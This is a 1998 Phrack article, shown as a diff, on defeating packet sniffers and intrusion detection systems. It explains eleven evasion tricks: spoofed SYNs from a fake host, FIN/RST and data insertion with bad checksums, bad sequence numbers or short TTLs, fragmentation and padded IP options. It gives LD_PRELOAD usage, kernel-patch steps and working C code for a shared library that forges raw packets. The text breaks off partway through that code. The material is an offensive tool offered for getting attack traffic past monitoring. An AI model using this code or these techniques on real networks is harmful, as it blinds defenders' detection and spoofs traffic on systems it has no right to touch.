@@ -1,0 +1,1540 @@
+---[  Phrack Magazine   Volume 8, Issue 54 Dec 25th, 1998, article 10 of 12
+
+
+-------------------------[  Defeating Sniffers and Intrusion Detection Systems
+
+
+--------[  horizon <jmcdonal@unf.edu>
+
+
+----[  Overview
+
+The purpose of this article is to demonstrate some techniques that can be used
+to defeat sniffers and intrusion detection systems.  This article focuses
+mainly on confusing your average "hacker" sniffer, with some rough coverage of
+Intrusion Detection Systems (IDS).  However, the methods and code present in
+this article should be a good starting point for getting your packets past ID
+systems.  For an intense examination of attack techniques against IDS, check
+out: http://www.nai.com/products/security/advisory/papers/ids-html/doc000.asp.
+
+There are a large number of effective techniques other than those that are
+implemented in this article.  I have chosen a few generic techniques that
+hopefully can be easily expanded into more targeted and complex attacks.  After
+implementing these attacks, I have gone through and attempted to correlate
+them to the attacks described in the NAI paper, where appropriate.
+
+The root cause of the flaws discussed in this article is that most sniffers
+and intrusion detection systems do not have as robust of a TCP/IP
+implementation as the machines that are actually communicating on the network.
+Many sniffers and IDS use a form of datalink level access, such as BPF, DLPI,
+or SOCK_PACKET.  The sniffer receives the entire datalink level frame, and
+gets no contextual clues from the kernel as to how that frame will be
+interpreted.  Thus, the sniffer has the job of interpreting the entire packet
+and guessing how the kernel of the receiving machine is going to process it.
+Luckily, 95% of the time, the packet is going to be sane, and the kernel
+TCP/IP stack is going to behave rather predictably.  It is the other 5% of the
+time that we will be focusing on.
+
+This article is divided into three sections: an overview of the techniques
+employed, a description of the implementation and usage, and the code.  Where
+possible, the code has been implemented in a somewhat portable format: a
+shared library that wraps around connect(), which you can use LD_PRELOAD to
+"install" into your normal client programs.  This shared library uses raw
+sockets to create TCP packets, which should work on most unixes. However, some
+of the attacks described are too complex to implement with raw sockets, so
+simple OpenBSD kernel patches are supplied.  I am working on complementary
+kernel patches for Linux, which will be placed on the rhino9 web site when
+they are complete.  The rhino9 web site is at: http://www.rhino9.ml.org/ 
+
+
+----[  Section 1. The Tricks
+
+The first set of tricks are solely designed to fool most sniffers, and will
+most likely have no effect on a decent ID system.  The second set of tricks
+should be advanced enough to start to have an impact on the effectiveness of
+an intrusion detection system.
+
+Sniffer Specific Attacks
+------------------------
+
+1. Sniffer Design - One Host Design
+
+The first technique is extremely simple, and takes advantage of the design of
+many sniffers.  Several hacker sniffers are designed to follow one connection,
+and ignore everything else until that connection is closed or reaches some
+internal time out.  Sniffers designed in this fashion have a very low profile,
+as far as memory usage and CPU time.  However, they obviously miss a great deal
+of the data that can be obtained.  This gives us an easy way of preventing our
+packets from being captured: before our connection, we send a spoofed SYN
+packet from a non-existent host to the same port that we are attempting to
+connect to.  Thus, the sniffer sees the SYN packet, and if it is listening, it
+will set up its internal state to monitor all packets related to that
+connection.  Then, when we make our connection, the sniffer ignores our SYN
+because it is watching the fake host.  When the host later times out, our
+connection will not be logged because our initial SYN packet has long been
+sent.
+
+
+2. Sniffer Design - IP options
+
+The next technique depends on uninformed coding practices within sniffers.
+If you look at the code for some of the hacker sniffers, namely ones based-off
+of the original linsniffer, you will see that they have a structure that looks
+like this:
+
+struct etherpacket
+{
+    etherheader eh;
+    ipheader ip;
+    tcpheader tcp;
+    char data[8192];
+};
+
+The sniffer will read a packet off of the datalink interface, and then slam it
+into that structure so it can analyze it easily.  This should work fine most
+of the time.  However, this approach makes a lot of assumptions: it assumes
+that the size of the IP header is 20 bytes, and it also assumes that the size
+of the TCP header is 20 bytes. If you send an IP packet with 40 bytes of
+options, then the sniffer is going to look inside your IP options for the TCP
+header, and completely misinterpret your packet.  If the sniffer handles your
+IP header correctly, but incorrectly handles the TCP header, that doesn't buy
+you quite as much.  In that situation, you get an extra 40 bytes of data that
+the sniffer will log. I have implemented mandatory IP options in the OpenBSD
+kernel such that it is manageable by a sysctl.
+
+
+3. Insertion - FIN and RST Spoofing - Invalid Sequence Numbers
+
+This technique takes advantage of the fact that your typical sniffer is not
+going to keep track of the specific details of the ongoing connection.  In a
+TCP connection, sequence numbers are used as a control mechanism for
+determining how much data has been sent, and the correct order for the data
+that has been sent.  Most sniffers do not keep track of the sequence numbers
+in an ongoing TCP connection.  This allows us to insert packets into the data
+stream that the kernel will disregard, but the sniffer will interpret as valid.
+The first technique we will use based on this is spoofing FIN and RST packets.
+FIN and RST are control flags inside the TCP packets, a FIN indicating the
+initiation of a shutdown sequence for one side of a connection, and an RST
+indicating that a connection should be immediately torn down. If we send a
+packet with a FIN or RST, with a sequence number that is far off of the current
+sequence number expected by the kernel, then the kernel will disregard it.
+However, the sniffer will likely regard this as a legitimate connection close
+request or connection reset, and cease logging.
+
+It is interesting to note that certain implementations of TCP stacks do not
+check the sequence numbers properly upon receipt of an RST.  This obviously
+provides a large potential for a denial of service attack.  Specifically, I
+have noticed that Digital Unix 4.0d will tear down connections without
+checking the sequence numbers on RST packets.
+
+
+4. Insertion - Data Spoofing - Invalid Sequence Numbers
+
+This technique is a variation of the previous technique, which takes advantage
+of the fact that a typical sniffer will not follow the sequence numbers of a
+TCP connection.  A lot of sniffers have a certain data capture length, such
+that they will stop logging a connection after that amount of data has been
+captured.  If we send a large amount of data after the connection initiation,
+with completely wrong sequence numbers, our packets will be dropped by the
+kernel.  However, the sniffer will potentially log all of that data as valid
+information.  This is roughly an implementation of the "tcp-7" attack mentioned
+in the NAI paper.
+
+
+IDS / Sniffer Attacks:
+---------------------
+
+The above techniques work suprisingly well for most sniffers, but they are not
+going to have much of an impact on most IDS.  The next six techniques are a
+bit more complicated, but represent good starting points for getting past the
+more complex network monitors. 
+
+
+5. Evasion - IP Fragmentation
+
+IP fragmentation allows packets to be split over multiple datagrams in order
+to fit packets within the maximum transmission unit of the physical network
+interface.  Typically, TCP is aware of the mtu, and doesn't send packets that
+need to be fragmented at an IP level.  We can use this to our advantage to try
+to confuse sniffers and IDS.  There are several potential attacks involving
+fragmentation, but we will only cover a simple one.  We can send a TCP packet
+split over several IP datagrams such that the first 8 bytes of the TCP header
+are in a single packet, and the rest of the data is sent in 32 byte packets.
+This actually buys us a lot in our ability to fool a network analysis tool.
+First of all, the sniffer/IDS will have to be capable of doing fragment
+reassembly.  Second of all, it will have to be capable of dealing with
+fragmented TCP headers.  It turns out that this simple technique is more than
+sufficient to get your packets past most datalink level network monitors.
+This an another attack that I chose to implement as a sysctl in the OpenBSD
+kernel.
+
+This technique is very powerful in it's ability to get past most sniffers
+completely.  However, it requires some experimentation because you have to
+make sure that your packets will get past all of the filters between you and
+the target.  Certain packet filters wisely drop fragmented packets that look
+like they are going to rewrite the UDP/TCP header, or that look like they are
+unduly small.  The implementation in this article provides a decent deal of
+control over the size of the fragments that your machine will output.  This
+will allow you to implement the "frag-1" and "frag-2" attacks described in the
+NAI paper.
+
+
+6. Desynchronization - Post Connection SYN
+
+If we are attempting to fool an intelligent sniffer, or an ID system, then we
+can be pretty certain that it will keep track of the TCP sequence numbers.  For
+this technique, we will attempt to desynchronize the sniffer/IDS from the
+actual sequence numbers that the kernel is honoring.  We will implement this
+attack by sending a post connection SYN packet in our data stream, which will
+have divergent sequence numbers, but otherwise meet all of the necessary
+criteria to be accepted by our target host.  However, the target host will
+ignore this SYN packet, because it references an already established
+connection.  The intent of this attack is to get the sniffer/IDS to
+resynchronize its notion of the sequence numbers to the new SYN packet.  It
+will then ignore any data that is a legitimate part of the original stream,
+because it will be awaiting a different sequence number.  If we succeed in
+resynchronizing the IDS with a SYN packet, we can then send an RST packet with
+the new sequence number and close down its notion of the connection.  This
+roughly corresponds with the "tcbc-2" attack mentioned in the NAI paper.
+
+
+7. Desynchronization - Pre Connection SYN
+
+Another attack we perform which is along this theme is to send an initial SYN
+before the real connection, with an invalid TCP checksum.  If the sniffer is
+smart enough to ignore subsequent SYNs in a connection, but not smart enough
+to check the TCP checksum, then this attack will synchronize the sniffer/IDS
+to a bogus sequence number before the real connection occurs.  This attack
+calls bind to get the kernel to assign a local port to the socket before
+calling connect.
+
+
+8. Insertion - FIN and RST Spoofing - TCP checksum validation
+
+This technique is a variation of the FIN/RST spoofing technique mentioned
+above.  However, this time we will attempt to send FIN and RST packets that
+should legitimately close the connection, with one notable exception: the TCP
+checksum will be invalid.  These packets will be immediately dropped by the
+kernel, but potentially honored by the IDS/sniffer.  This attack requires
+kernel support in order to determine the correct sequence numbers to use on
+the packet.  This is similar to the "insert-2" attack in the NAI paper.
+
+
+9. Insertion - Invalid Data - TCP checksum validation 
+
+This technique is a variation of the previous data insertion attack, with the
+exception that we will be inserting data with the correct sequence numbers,
+but incorrect TCP checksums.  This will serve to confuse and desynchronize
+sniffers and ID by feeding it a lot of data that will not be honored by the
+participating kernels.  This attack requires kernel support to get the correct
+sequence numbers for the outgoing packets.  This attack is also similar to the
+"insert-2" attack described in the NAI paper.
+
+
+10. Insertion - FIN and RST Spoofing - Short TTL
+
+If the IDS or sniffer is sitting on the network such that it is one or more
+hops away from the host it is monitoring, then we can do a simple attack,
+utilizing the TTL field of the IP packet.  For this attack, we determine the
+lowest TTL that can be used to reach the target host, and then subtract one.
+This allows us to send packets that will not reach the target host, but that
+have the potential of reaching the IDS or sniffer. In this attack, we send a
+couple of FIN packets, and a couple of RST packets.
+
+
+11. Insertion - Data Spoofing - Short TTL
+
+For our final attack, we will send 8k of data with the correct sequence
+numbers and TCP checksums. However, the TTL will be one hop too short to reach
+our target host. 
+
+Summary
+-------
+
+All of these attacks work in concert to confuse sniffers and IDS.  Here is a
+breakdown of the order in which we perform them:
+
+Attack 1 - One Host Sniffer Design.
+  FAKEHOST -> TARGET SYN 
+Attack 7 - Pre-connect Desynchronization Attempt.
+  REALHOST -> TARGET SYN (Bad TCP Checksum, Arbitrary Seq Number)
+Kernel Activity
+  REALHOST -> TARGET SYN (This is the real SYN, sent by our kernel)
+Attack 6 - Post-connect Desynchronization Attempt.
+  REALHOST -> TARGET SYN (Arbitrary Seq Number X)
+  REALHOST -> TARGET SYN (Seq Number X+1)
+Attack 4 - Data Spoofing - Invalid Sequence Numbers
+  REALHOST -> TARGET DATA x 8 (1024 bytes, Seq Number X+2)
+Attack 5 - FIN/RST Spoofing - Invalid Sequence Numbers
+  REALHOST -> TARGET FIN (Seq Number X+2+8192)
+  REALHOST -> TARGET FIN (Seq Number X+3+8192)
+  REALHOST -> TARGET RST (Seq Number X+4+8192)
+  REALHOST -> TARGET RST (Seq Number X+5+8192)
+Attack 11 - Data Spoofing - TTL 
+* REALHOST -> TARGET DATA x 8 (1024 bytes, Short TTL, Real Seq Number Y)
+Attack 10 - FIN/RST Spoofing - TTL
+* REALHOST -> TARGET FIN (Short TTL, Seq Number Y+8192)
+* REALHOST -> TARGET FIN (Short TTL, Seq Number Y+1+8192)
+* REALHOST -> TARGET RST (Short TTL, Seq Number Y+2+8192)
+* REALHOST -> TARGET RST (Short TTL, Seq Number Y+3+8192)
+Attack 9 - Data Spoofing - Checksum
+* REALHOST -> TARGET DATA x 8 (1024 bytes, Bad TCP Checksum, Real Seq Number Z)
+Attack 8 - FIN/RST Spoofing - Checksum
+* REALHOST -> TARGET FIN (Bad TCP Checksum, Seq Number Z+8192)
+* REALHOST -> TARGET FIN (Bad TCP Checksum, Seq Number Z+1+8192)
+* REALHOST -> TARGET RST (Bad TCP Checksum, Seq Number Z+2+8192)
+* REALHOST -> TARGET RST (Bad TCP Checksum, Seq Number Z+3+8192)
+
+The attacks with an asterisk require kernel support to determine the correct
+sequence numbers.  Arguably, this could be done without kernel support,
+utilizing a datalink level sniffer, but it would make the code significantly
+more complex, because it would have to reassemble fragments, and do several
+validation checks in order to follow the real connection.  The user can choose 
+which of these attacks he/she would like to perform, and the sequence numbers
+will adjust themselves accordingly.
+
+
+----[  Section 2 - Implementation and Usage
+
+My primary goal when implementing these techniques was to keep the changes
+necessary to normal system usage as slight as possible.  I had to divide the
+techniques into two categories: attacks that can be performed from user
+context, and attacks that have to be augmented by the kernel in some fashion.
+My secondary goal was to make the userland set of attacks reasonably portable
+to other Unix environments, besides OpenBSD and Linux. 
+
+The userland attacks are implemented using shared library redirection, an
+extremely useful technique borrowed from halflife's P51-08 article.  The first
+program listed below, congestant.c, is a shared library that the user requests
+the loader to link first.  This is done with the LD_PRELOAD environment
+variable on several unixes.  For more information about this technique, refer
+to the original article by halflife. 
+
+The shared library defines the connect symbol, thus pre-empting the normal
+connect function from libc (or libsocket) during the loading phase of program
+execution.  Thus, you should be able to use these techniques with most any
+client program that utilizes normal BSD socket functionality.  OpenBSD does
+not let us do shared library redirection (when you attempt to dlsym the old
+symbol out of libc, it gives you a pointer to the function you had pre-loaded).
+However, this is not a problem because we can just call the connect() syscall
+directly.
+
+This shared library has some definite drawbacks, but you get what you pay for.
+It will not work correctly with programs that do non-blocking connect calls,
+or RAW or datalink level access.  Furthermore, it is designed for use on TCP
+sockets, and without kernel support to determine the type of a socket, it will
+attempt the TCP attacks on UDP connections.  This support is currently only
+implemented under OpenBSD.  However, this isn't that big of a drawback because
+it just sends a few packets that get ignored.  Another drawback to the shared
+library is that it picks a sequence number out of the blue to represent the
+"wrong" sequence number.  Due to this fact, there is a very small possibility
+that the shared library will pick a legitimate sequence number, and not
+desynchronize the stream.  This, however, is extremely unlikely.
+
+A Makefile accompanies the shared library.  Edit it to fit your host, and then
+go into the source file and make it point to your copy of libc.so, and you
+should be ready to go.  The code has been tested on OpenBSD 2.3, 2.4, Debian
+Linux, Slackware Linux, Debian glibc Linux, Solaris 2.5, and Solaris 2.6.
+You can use the library like this:
+
+# export LD_PRELOAD=./congestion.so
+# export CONGCONF="DEBUG,OH,SC,SS,DS,FS,RS"
+# telnet www.blah.com
+
+The library will "wrap" around any connects in the programs you run from that
+point on, and provide you some protection behind the scenes.  You can control
+the program by defining the CONGCONF environment variable.  You give it a
+comma delimited list of attacks, which break out like this:
+
+DEBUG: Show debugging information
+OH: Do the One Host Design Attack
+SC: Spoof a SYN prior to the connect with a bad TCP checksum.
+SS: Spoof a SYN after the connection in a desynchronization attempt.
+DS: Insert 8k of data with bad sequence numbers.
+FS: Spoof FIN packets with bad sequence numbers.
+RS: Spoof RST packets with bad sequence numbers.
+DC: Insert 8k of data with bad TCP checksums. (needs kernel support)
+FC: Spoof FIN packets with bad TCP checksums. (needs kernel support)
+RC: Spoof RST packets with bad TCP checksums. (needs kernel support)
+DT: Insert 8k of data with short TTLs. (needs kernel support)
+FT: Spoof FIN packets with short TTLs. (needs kernel support)
+RT: Spoof RST packets with short TTLs. (needs kernel support)
+
+Kernel Support
+--------------
+
+OpenBSD kernel patches are provided to facilitate several of the techniques
+described above.  These patches have been made against the 2.4 source
+distribution. I have added three sysctl variables to the kernel, and one new
+system call.  The three sysctl variables are:
+
+net.inet.ip.fraghackhead (integer)
+net.inet.ip.fraghackbody (integer)
+net.inet.ip.optionshack  (integer)
+
+The new system call is getsockinfo(), and it is system call number 242.
+
+The three sysctl's can be used to modify the characteristics of every outgoing
+IP packet coming from the machine.  The fraghackhead variable specifies a new
+mtu, in bytes, for outgoing IP datagrams.  fraghackhead is applied to every
+outgoing datagram, unless fraghackbody is also defined.  In that case, the mtu
+for the first fragment of a packet is read from fraghackhead, and the mtu for
+every consecutive fragment is read from fraghackbody.  This allows you to
+force your machine into fragmenting all of its traffic, to any size that you
+specify.  The reason it is divided into two variables is so that you can have
+the first fragment contain the entire TCP/UDP header, and have the following
+fragments be 8 or 16 bytes.  This way, you can get your fragmented packets past
+certain filtering routers that block any sort of potential header rewriting.
+The optionshack sysctl allows you to turn on mandatory 40 bytes of NULL IP
+options on every outgoing packet. 
+
+I implemented these controls such that they do not have any effect on packets
+sent through raw sockets.  The implication of this is that our attacking
+packets will not be fragmented or contain IP options.
+
+Using these sysctl's is pretty simple: for the fraghack variables, you specify
+a number of bytes (or 0 to turn them off), and for the optionshack, you either
+set it to 0 or 1. Here is an example use:
+
+# sysctl -w net.inet.ip.optionshack=1    # 40 bytes added to header
+# sysctl -w net.inet.ip.fraghackhead=80  # 20 + 40 + 20 = full protocol header 
+# sysctl -w net.inet.ip.fraghackbody=68  # 20 + 40 + 8 = smallest possible frag
+
+It is very important to note that you should be careful with the fraghack
+options.  When you specify extreme fragmentation, you quickly eat up the
+memory that the kernel has available for storing packet headers.  If memory
+usage is too high, you will notice sendto() returning a no buffer space error.
+If you stick to programs like telnet or ssh, that use small packets, then you 
+should be fine with 28 or 28/36. However, if you use programs that use large 
+packets like ftp or rcp, then you should bump fraghackbody up to a higher 
+number, such as 200.
+
+The system call, getsockinfo, is needed by the userland program to determine if
+a socket is a TCP socket, and to query the kernel for the next sequence number
+that it expects to send on the next outgoing packet, as well as the next
+sequence number it expects to receive from it's peer.  This allows the
+userland program to implement attacks based on having a correct sequence
+number, but some other flaw in the packet such as a short TTL or bad TCP
+checksum.
+
+
+Kernel Patch Installation
+-------------------------
+
+Here are the steps I use to install the kernel patches.
+
+Disclaimer: I am not an experienced kernel programmer, so don't be too upset
+if your box gets a little flaky.  The testing I've done on my own machines has
+gone well, but be aware that you really are screwing with critical stuff by
+installing these patches. You may suffer performance hits, or other such
+unpleasentries.  But hey, you can't have any fun if you don't take any risks. :>
+
+Step 1. Apply the netinet.patch to /usr/src/sys/netinet/
+Step 2. cp /usr/src/sys/netinet/in.h to /usr/include/netinet/in.h
+Step 3. go into /usr/src/usr.sbin/sysctl, and rebuild and install it
+Step 4. Apply kern.patch to /usr/src/sys/kern/
+Step 5. cd /usr/src/sys/kern; make
+Step 6. Apply sys.patch to /usr/src/sys/sys/
+Step 7. cd into your kernel build directory
+	(/usr/src/sys/arch/XXX/compile/XXX), and do a make depend && make. 
+Step 8. cp bsd /bsd, reboot, and cross your fingers. :>
+
+
+----[  The Code
+<++> congestant/Makefile
+# OpenBSD
+LDPRE=-Bshareable
+LDPOST=
+OPTS=-DKERNELSUPPORT
+
+# Linux
+#LDPRE=-Bshareable
+#LDPOST=-ldl
+#OPTS=
+
+# Solaris
+#LDPRE=-G
+#LDPOST=-ldl
+#OPTS=-DBIG_ENDIAN=42 -DBYTEORDER=42 
+
+congestant.so: congestant.o
+	ld ${LDPRE} -o congestant.so congestant.o ${LDPOST}
+
+congestant.o: congestant.c
+	gcc ${OPTS} -fPIC -c congestant.c
+
+clean: 
+	rm -f congestant.o congestant.so
+<-->
+<++> congestant/congestant.c
+/* 
+ * congestant.c - demonstration of sniffer/ID defeating techniques 
+ *
+ * by horizon <jmcdonal@unf.edu>
+ * special thanks to stran9er, mea culpa, plaguez, halflife, and fyodor
+ *
+ * openbsd doesn't let us do shared lib redirection, so we implement the
+ * connect system call directly. Also, the kernel support for certain attacks
+ * is only implemented in openbsd. When I finish the linux support, it will
+ * be available at http://www.rhino9.ml.org
+ *
+ * This whole thing is a conditionally compiling nightmare. :>
+ * This has been tested under OpenBSD 2.3, 2.4, Solaris 2.5, Solaris 2.5.1,
+ * Solaris 2.6, Debian Linux, and the glibc Debian Linux 
+ */
+
+/* The path to our libc. (libsocket under Solaris) */
+/* You don't need this if you are running OpenBSD */
+/* #define LIB_PATH "/usr/lib/libsocket.so" */
+#define LIB_PATH "/lib/libc-2.0.7.so"
+/* #define LIB_PATH "/usr/lib/libc.so"  */
+
+/* The source of our initial spoofed SYN in the One Host Design attack */
+/* This has to be some host that will survive any outbound packet filters */
+#define FAKEHOST "42.42.42.42"
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/uio.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <fcntl.h>
+#include <dlfcn.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/time.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#if __linux__
+#include <endian.h>
+#endif
+#include <errno.h>
+
+struct cong_config
+{
+	int one_host_attack;
+	int fin_seq;
+	int rst_seq;
+	int syn_seq;
+	int data_seq;	
+	int data_chk;	
+	int fin_chk;
+	int rst_chk;
+	int syn_chk;
+	int data_ttl;	
+	int fin_ttl;
+	int rst_ttl;
+	int ttl;
+} cong_config;
+
+int cong_init=0;
+int cong_debug=0;
+long cong_ttl_cache=0;
+int cong_ttl=0;
+
+/* If this is not openbsd, then we will use the connect symbol from libc */
+/* otherwise, we will use syscall(SYS_connect, ...) */
+
+#ifndef __OpenBSD__
+
+#if __GLIBC__ == 2
+int (*cong_connect)(int, __CONST_SOCKADDR_ARG, socklen_t)=NULL;
+#else 
+int (*cong_connect)(int, const struct sockaddr *, int)=NULL;
+#endif 
+
+#endif /* not openbsd */
+
+#define DEBUG(x) if (cong_debug==1) fprintf(stderr,(x));
+
+/* define our own headers so its easier to port. use cong_ to avoid any 
+ * potential symbol name collisions */
+
+struct cong_ip_header
+{
+	unsigned char  ip_hl:4,         /* header length */
+		ip_v:4;               /* version */
+	unsigned char  ip_tos;          /* type of service */
+	unsigned short ip_len;          /* total length */
+	unsigned short ip_id;           /* identification */
+	unsigned short ip_off;          /* fragment offset field */
+#define IP_RF 0x8000                    /* reserved fragment flag */
+#define IP_DF 0x4000                    /* dont fragment flag */
+#define IP_MF 0x2000                    /* more fragments flag */
+#define IP_OFFMASK 0x1fff               /* mask for fragmenting bits */
+	unsigned char  ip_ttl;          /* time to live */
+	unsigned char  ip_p;                    /* protocol */
+	unsigned short ip_sum;          /* checksum */
+	unsigned long ip_src, ip_dst; /* source and dest address */
+};
+
+struct cong_icmp_header /* this is really an echo */
+{
+   unsigned char icmp_type;
+   unsigned char icmp_code;
+   unsigned short icmp_checksum;
+   unsigned short icmp_id;
+   unsigned short icmp_seq;
+   unsigned long icmp_timestamp;
+};
+
+struct cong_tcp_header 
+{
+   unsigned short  th_sport;      /* source port */
+   unsigned short  th_dport;      /* destination port */
+   unsigned int  th_seq;        /* sequence number */
+   unsigned int  th_ack;        /* acknowledgement number */
+#if BYTE_ORDER == LITTLE_ENDIAN
+   unsigned char   th_x2:4,    /* (unused) */
+      th_off:4;      /* data offset */
+#endif
+#if BYTE_ORDER == BIG_ENDIAN
+   unsigned char   th_off:4,      /* data offset */
+      th_x2:4;    /* (unused) */
+#endif
+   unsigned char   th_flags;
+#define  TH_FIN   0x01
+#define  TH_SYN   0x02
+#define  TH_RST   0x04
+#define  TH_PUSH  0x08
+#define  TH_ACK   0x10
+#define  TH_URG   0x20
+   unsigned short  th_win;        /* window */
+   unsigned short  th_sum;        /* checksum */
+   unsigned short  th_urp;        /* urgent pointer */
+};
+
+struct cong_pseudo_header
+{  
+	unsigned long saddr, daddr;
+	char mbz;
+	char ptcl;
+	unsigned short tcpl;
+};
+
+int cong_checksum(unsigned short* data, int length)
+{
+	register int nleft=length;
+	register unsigned short *w = data;
+	register int sum=0;
+	unsigned short answer=0;
+
+	while (nleft>1)
+	{
+		sum+=*w++;
+		nleft-=2;
+	}
+
+	if (nleft==1)
+	{
+		*(unsigned char *)(&answer) = *(unsigned char *)w;
+		sum+=answer;
+	}
+
+	sum=(sum>>16) + (sum & 0xffff);
+	sum +=(sum>>16);
+	answer=~sum;
+
+        return answer;
+}
+
+#define PHLEN (sizeof (struct cong_pseudo_header))
+#define IHLEN (sizeof (struct cong_ip_header))
+#define ICMPLEN (sizeof (struct cong_icmp_header))
+#define THLEN (sizeof (struct cong_tcp_header))
+
+/* Utility routine for the ttl attack. Sends an icmp echo */
+
+void cong_send_icmp(long source, long dest, int seq, int id, int ttl)
+{
+	struct sockaddr_in sa;
+	int sock,packet_len;
+	char *pkt;
+	struct cong_ip_header *ip;
+	struct cong_icmp_header *icmp;
+
+	int on=1;
+
+	if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+	{
+		perror("socket");
+		exit(1);
+	}
+
+	if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0) 
+	{
+		perror("setsockopt: IP_HDRINCL");
+		exit(1);
+	}
+
+	bzero(&sa,sizeof(struct sockaddr_in));
+        sa.sin_addr.s_addr = dest;
+        sa.sin_family = AF_INET;
+
+	pkt=calloc((size_t)1,(size_t)(IHLEN+ICMPLEN));
+
+	ip=(struct cong_ip_header *)pkt;
+	icmp=(struct cong_icmp_header *)(pkt+IHLEN);
+	
+	ip->ip_v = 4;
+	ip->ip_hl = IHLEN >>2;
+	ip->ip_tos = 0;
+	ip->ip_len = htons(IHLEN+ICMPLEN);
+	ip->ip_id = htons(getpid() & 0xFFFF);
+	ip->ip_off = 0;
+	ip->ip_ttl = ttl;
+	ip->ip_p = IPPROTO_ICMP ;//ICMP
+	ip->ip_sum = 0;
+	ip->ip_src = source;
+	ip->ip_dst = dest;
+	icmp->icmp_type=8;
+	icmp->icmp_seq=htons(seq);
+	icmp->icmp_id=htons(id);
+	icmp->icmp_checksum=cong_checksum((unsigned short*)icmp,ICMPLEN);
+
+	if(sendto(sock,pkt,IHLEN+ICMPLEN,0,(struct sockaddr*)&sa,sizeof(sa)) < 0)
+	{
+		perror("sendto");
+	}
+
+	free(pkt);
+	close(sock);
+}
+
+/* Our main worker routine. sends a TCP packet */
+
+void cong_send_tcp(long source, long dest,short int sport, short int dport,
+ 		long seq, long ack, int flags, char *data, int dlen, 
+			int cksum, int ttl)
+{
+	struct sockaddr_in sa;
+	int sock,packet_len;
+	char *pkt,*phtcp;
+	struct cong_pseudo_header *ph;
+	struct cong_ip_header *ip;
+	struct cong_tcp_header *tcp;
+
+	int on=1;
+
+	if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
+	{
+		perror("socket");
+		exit(1);
+	}
+
+	if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0) 
+	{
+		perror("setsockopt: IP_HDRINCL");
+		exit(1);
+	}
+
+	bzero(&sa,sizeof(struct sockaddr_in));
+        sa.sin_addr.s_addr = dest;
+        sa.sin_family = AF_INET;
+	sa.sin_port = dport;
+
+	phtcp=calloc((size_t)1,(size_t)(PHLEN+THLEN+dlen));
+	pkt=calloc((size_t)1,(size_t)(IHLEN+THLEN+dlen));
+
+	ph=(struct cong_pseudo_header *)phtcp;
+	tcp=(struct cong_tcp_header *)(((char *)phtcp)+PHLEN);
+	ip=(struct cong_ip_header *)pkt;
+	
+	ph->saddr=source;
+	ph->daddr=dest;
+	ph->mbz=0;
+	ph->ptcl=IPPROTO_TCP;
+	ph->tcpl=htons(THLEN + dlen);
+
+	tcp->th_sport=sport;
+	tcp->th_dport=dport;
+	tcp->th_seq=seq;
+	tcp->th_ack=ack;
+	tcp->th_off=THLEN/4;
+	tcp->th_flags=flags;
+	if (ack) tcp->th_flags|=TH_ACK;
+	tcp->th_win=htons(16384);
+	memcpy(&(phtcp[PHLEN+THLEN]),data,dlen);
+	tcp->th_sum=cong_checksum((unsigned short*)phtcp,PHLEN+THLEN+dlen)+cksum;
+                            
+	ip->ip_v = 4;
+	ip->ip_hl = IHLEN >>2;
+	ip->ip_tos = 0;
+	ip->ip_len = htons(IHLEN+THLEN+dlen);
+	ip->ip_id = htons(getpid() & 0xFFFF);
+	ip->ip_off = 0;
+	ip->ip_ttl = ttl;
+	ip->ip_p = IPPROTO_TCP ;//TCP
+	ip->ip_sum = 0;
+	ip->ip_src = source;
+	ip->ip_dst = dest;
+	ip->ip_sum = cong_checksum((unsigned short*)ip,IHLEN);
+
+	memcpy(((char *)(pkt))+IHLEN,(char *)tcp,THLEN+dlen);
+
+	if(sendto(sock,pkt,IHLEN+THLEN+dlen,0,(struct sockaddr*)&sa,sizeof(sa)) < 0)
+	{
+		perror("sendto");
+	}
+
+	free(phtcp);
+	free(pkt);
+	close(sock);
+}
+
+/* Utility routine for data insertion attacks */
+
+void cong_send_data(long source, long dest,short int sport, short int dport,
+			long seq, long ack, int chk, int ttl)
+{
+	char data[1024];
+	int i,j;
+
+	for (i=0;i<8;i++)
+	{
+		for (j=0;j<1024;data[j++]=random());
+
+		cong_send_tcp(source, dest, sport, dport, htonl(seq+i*1024), 
+			htonl(ack), TH_PUSH, data, 1024, chk, ttl);
+	}
+}
+
+/* Utility routine for the ttl attack  - potentially unreliable */
+/* This could be rewritten to look for the icmp ttl exceeded and count
+ * the number of packets it receives, thus going much quicker. */
+
+int cong_find_ttl(long source, long dest)
+{
+	int sock;
+	long timestamp;	
+	struct timeval tv,tvwait;
+	int ttl=0,result=255;
+	char buffer[8192];
+	int bread;
+	fd_set fds;
+	struct cong_ip_header *ip;
+	struct cong_icmp_header *icmp;
+
+	if( (sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0)
+	{
+		perror("socket");
+		exit(1);
+	}
+	tvwait.tv_sec=0;
+	tvwait.tv_usec=500;
+
+	gettimeofday(&tv,NULL);
+	timestamp=tv.tv_sec+3; // 3 second timeout
+	
+	DEBUG("Determining ttl...");
+
+	while(tv.tv_sec<=timestamp)
+	{
+		gettimeofday(&tv,NULL);
+		if (ttl<50)
+		{
+			cong_send_icmp(source,dest,ttl,1,ttl);
+			cong_send_icmp(source,dest,ttl,1,ttl);
+			cong_send_icmp(source,dest,ttl,1,ttl++);
+		}	
+		FD_ZERO(&fds);
+		FD_SET(sock,&fds);
+		select(sock+1,&fds,NULL,NULL,&tvwait);
+		if (FD_ISSET(sock,&fds))
+		{
+			if (bread=read(sock,buffer,sizeof(buffer)))
+			{
+				/* should we practice what we preach? 
+					nah...  too much effort :p */
+
+				ip=(struct cong_ip_header *)buffer;
+				if (ip->ip_src!=dest)
+					continue;
+				icmp=(struct cong_icmp_header *)(buffer +
+					 ((ip->ip_hl)<<2));
+				if (icmp->icmp_type!=0)
+					continue;
+				if (ntohs(icmp->icmp_seq)<result)
+					result=ntohs(icmp->icmp_seq);
+			}
+		}
+	}
+	if (cong_debug)
+		fprintf(stderr,"%d\n",result);
+
+	close(sock);
+	return result;
+}
+
+/* This is our init routine - reads conf env var*/
+
